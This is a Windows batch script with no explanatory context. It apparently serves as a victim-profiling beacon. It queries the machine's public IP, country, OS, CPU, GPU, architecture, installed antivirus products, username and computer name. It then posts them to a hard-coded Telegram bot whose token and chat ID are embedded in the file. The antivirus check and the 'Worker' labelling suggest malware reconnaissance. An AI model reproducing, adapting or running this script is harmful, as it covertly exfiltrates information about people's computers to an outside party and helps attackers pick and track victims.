@echo off
setlocal EnableDelayedExpansion

set "TOKEN=7615353876:AAF-Mcj1DDxs85m-pU4fAIR34jJ1r8y7p54"
set "CHAT_ID=5674938532"

for /f "tokens=1,2 delims=|" %a in ('
    powershell -NoProfile -Command ^
        "try { $json = Invoke-RestMethod -Uri 'http://ip-api.com/json/'; $json.query + '|' + $json.country } catch { 'Unknown|Unknown' }"
') do (
    set "IP=%a"
    set "Country=%b"
)

if "%IP%"=="Unknown" set "IP=No IP"
if "%Country%"=="Unknown" set "Country=No Country"

for /f "delims=" %a in ('
    powershell -NoProfile -Command ^
        "try { (Get-CimInstance -ClassName Win32_OperatingSystem).Caption } catch { 'Unknown' }"
') do set "Windows=%a"
if "%Windows%"=="Unknown" set "Windows=Not detected"

for /f "delims=" %a in ('
    powershell -NoProfile -Command ^
        "try { (Get-CimInstance -ClassName Win32_Processor).Name } catch { 'Unknown' }"
') do set "CPU=%a"
if "%CPU%"=="Unknown" set "CPU=Not detected"

for /f "delims=" %a in ('
    powershell -NoProfile -Command ^
        "try { (Get-CimInstance -ClassName Win32_VideoController).Caption } catch { 'Unknown' }"
') do set "GPU=%a"
if "%GPU%"=="Unknown" set "GPU=Not detected"

for /f "delims=" %a in ('
    powershell -NoProfile -Command ^
        "try { if ([System.Environment]::Is64BitOperatingSystem) { 'X64' } else { 'X86' } } catch { 'Unknown' }"
') do set "Arch=%a"
if "%Arch%"=="Unknown" set "Arch=Not detected"

for /f "delims=" %a in ('
    powershell -NoProfile -Command ^
        "try { (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName) -join ', ' } catch { 'No Antivirus' }"
') do set "Antivirus=%a"
if "%Antivirus%"=="No Antivirus" set "Antivirus=None"

set "UserName=%USERNAME%"
set "Worker=%COMPUTERNAME%"

powershell -NoProfile -Command ^
  "[System.Console]::OutputEncoding = [System.Text.Encoding]::UTF8; " ^
  "$message = \"RUSnIP: %IP%nCountry: %Country%nWorker: %Worker%nUserName: %UserName%nWindows: %Windows% %Arch%nCPU: %CPU%nGPU: %GPU%nAntivirus: %Antivirus%\"; " ^
  "try { Invoke-RestMethod -Uri \"https://api.telegram.org/bot%TOKEN%/sendMessage\" -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message} } catch { Write-Host 'Error sending message to Telegram' }"
endlocal
